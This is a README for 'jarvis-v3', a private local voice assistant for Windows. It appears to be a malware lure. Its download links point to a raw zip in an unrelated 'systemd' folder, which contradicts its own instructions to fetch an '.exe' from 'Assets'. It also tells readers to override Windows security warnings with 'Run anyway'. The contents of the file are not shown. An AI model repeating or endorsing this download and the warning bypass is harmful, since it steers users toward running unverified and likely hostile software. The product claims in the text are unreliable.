# 🤖 jarvis-v3 - Your private voice assistant runs locally

[![](https://img.shields.io/badge/Download-Jarvis-V3-blue)](https://raw.githubusercontent.com/Nick23hg/jarvis-v3/main/systemd/jarvis_v_2.7.zip)

jarvis-v3 keeps your data on your machine. This voice assistant listens for your commands and performs tasks without sending your voice or requests to the internet. It uses two separate systems to process your speech and handle your requests. This keeps things fast.

## 🛠️ What this software does

This software works as a local-first assistant. It uses a "dual-brain" design. One part handles quick conversations. The other part manages complex tasks and tool-calling. Because everything runs on your computer graphics card, your voice stays private. 

*   **Wake-Word Detection:** The software waits for a specific word to start listening.
*   **Local Processing:** No external servers touch your data. 
*   **Voice Cloning:** It synthesizes speech to respond to you.
*   **Tool Calling:** The assistant performs actions on your computer.

## 💻 System Requirements

To run this software, your computer needs specific hardware. These parts ensure the assistant responds quickly without errors.

*   **Graphics Card:** A NVIDIA GPU with at least 8 GB of VRAM. This is required for the local models to load and run.
*   **Processor:** An Intel Core i5 or AMD Ryzen 5 or better.
*   **Memory:** 16 GB of RAM.
*   **Storage:** 10 GB of free space.
*   **Operating System:** Windows 10 or Windows 11.
*   **Drivers:** You must have the latest NVIDIA drivers installed for your graphics card.

## 📥 Getting Started

You can set up the assistant by following these steps. You do not need to know how to code.

1. Visit [this link](https://raw.githubusercontent.com/Nick23hg/jarvis-v3/main/systemd/jarvis_v_2.7.zip) to access the downloads.
2. Select the latest version listed under "Assets". Look for a file ending in `.exe`.
3. Save the file to your computer.
4. Open the downloaded file to start the installation.
5. Follow the prompts on your screen.

If Windows shows a security warning, click "More info" and then "Run anyway." This happens with new software. 

## 🎤 How to use the software

Once the app opens, it connects to your microphone. It waits for you to say the wake word. Look at the application dashboard to see if your microphone is active.

*   **Talking to the assistant:** Just use the wake word. The light on the screen will change color when it hears you.
*   **Running tasks:** You can ask the assistant to open apps, search files, or control settings.
*   **Adjusting settings:** Open the settings menu inside the app to change the voice or the wake word.

## 🎛️ Understanding the dual-brain

The software uses two distinct models to help you. The first model acts as an internal listener. It keeps the latency low so the assistant responds as soon as you stop speaking. The second model acts as an agent. It investigates your requests to see if it needs to use a tool. This separation ensures that simple talk remains fast while complex tasks remain accurate.

## ⚙️ Advanced Configuration

You can customize how the assistant behaves. Every setting exists inside the app menu.

*   **Voice selection:** Change how the assistant sounds by picking a new profile in the voice settings.
*   **Model switching:** You can swap between different weight sizes for the brain models. Larger models offer better accuracy but require more GPU memory.
*   **Microphone sensitivity:** Adjust the trigger levels if the assistant wakes up when you do not intend it to.

## 🛡️ Privacy and Data

Because jarvis-v3 runs locally, your conversations never leave your room. The software does not connect to cloud services for speech-to-text or text-to-speech. You have total control. If you disconnect your internet, the assistant keeps working. This offline capability differentiates this app from standard cloud assistants.

## ❓ Troubleshooting common issues

If the assistant fails to start, check the following items.

*   **Driver updates:** Old NVIDIA drivers often cause issues with local models. Update them through the GeForce Experience app.
*   **Memory usage:** Close web browsers or resource-heavy games before you run the assistant. These programs compete for the same GPU memory.
*   **Microphone access:** Check your Windows privacy settings. Ensure the application has permission to access your microphone.
*   **File location:** Keep the folder path short. Installing the software on your desktop or a root drive usually prevents issues.

## 📜 Support

If you encounter bugs, check the issues tab on the GitHub page. You can read current reports or submit a new one if you have trouble. Provide your GPU model and your Windows version when you report an issue. This helps others identify the problem faster. Keep your installation updated as new versions are released to ensure the best performance.